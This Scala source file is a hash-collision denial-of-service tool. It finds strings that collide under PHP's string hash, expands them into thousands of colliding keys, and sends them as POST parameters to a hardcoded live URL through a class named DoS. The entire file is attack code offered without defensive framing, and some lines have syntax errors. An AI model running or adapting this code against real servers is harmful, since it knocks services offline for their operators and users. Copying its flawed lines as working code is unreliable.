import java.io.{ObjectOutputStream, FileOutputStream}
import dispatch._
import scala.actors._

class DoS(url: String, port: Int) extends Actor {
	def act {
		Collision.attackURL(url, port, Collision.postParams)
	}
}

object Collision { 
	var postParams = List( ("a", "b") )
	def main(args: Array[String]) {
		val numIterations: Int = if(args.length < 1) 10000 else args(0).toInt
		var collisions = List[String]()	// prefilled for testing only
		val collisionExponent = 9
		val filename = "collisions.txt"
		val hashFun = phpHash _

		println("Searching for at least three colliding strings")

		while(collisions.length < 3) {
			val stringSeed = util.Random.nextInt(5184)
			val hash = hashFun(StringFromInt(stringSeed))
			// hashcode range for AA to zz
			collisions = findStringsForHashCode(numIterations, hash, hashFun)
		}

		print("Found them: ")
		println(collisions.map("\"" + _ + "\"").mkString(", "))
		println("For hashcode " + hashFun( collisions.head )

		println("Generating %d^%d = %d derived collisions".format(collisions.length, collisionExponent, math.pow(collisions.length, collisionExponent)))

		val manyCols = makeCollisions(collisions.toArray, collisionExponent)

    	

		postParams = manyCols.toList.map( (_, "a") )

    	(0 to 0).foreach( t => (new DoS("http://furidamu.org/index.php", 80)).start() )

    	print("attacked!")

	}

	def attackURL(target: String, port: Int, postParams: List[(String, String)]) {
		val req = url(target)
		val ignoreResult = (req << postParams) >|
	    val http = new Http
		http((req << postParams) as_str)
	}

	val charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"

	def makeCollisions(baseCols: Array[String], raisedTo: Int) = {
		val state = (1 to raisedTo).map(t => 0).toArray
		val res = collection.mutable.ListBuffer[String]()

		while(1 + res.length < math.pow(baseCols.length, raisedTo) ) {
			res += (0 until raisedTo).map(t => baseCols(state(t))).mkString
			state(state.length - 1) += 1
			(state.length - 1 to 0 by -1).foreach( i => {
				if(state(i) >= baseCols.length) {
					state(i) = 0
					state(i - 1) += 1
				}
			})
		}
		res
	}

	def StringFromInt(n: Int): String = {
		if(n == 0) "" 
		else StringFromInt(n / charset.length) + charset.charAt((n-1) % charset.length)
	}

	def findStringsForHashCode(numIterations: Int, code: Int, hashFun: String => Int) = {
		var collisions = List[String]()
		var i = 0
		while(i < numIterations) {
			if(hashFun(StringFromInt(i)) == code) {
				collisions ::= StringFromInt(i)
			}
			i += 1
		}
			
		collisions	
	}

	def javaHash(s: String) = s.map(_.toInt).reduceLeft( (hash, next) => hash * 31 + next)

	def phpHash(s: String) = s.map(_.toInt).foldLeft(5381)( (hash, next) => hash * 33 + next)


}